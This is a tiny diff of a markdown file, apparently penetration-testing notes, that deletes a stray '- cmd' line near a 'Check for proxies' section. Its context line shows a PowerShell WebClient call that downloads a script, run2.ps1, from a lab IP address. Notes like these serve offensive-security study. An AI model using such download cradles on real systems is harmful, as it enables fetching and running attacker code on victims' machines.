@@ -143,7 +143,6 @@ $wc.DownloadString("http://192.168.119.120/run2.ps1")
 
 ### Check for proxies
 
-- cmd
 ```cmd
 $proxySettings = netsh winhttp show proxy
 
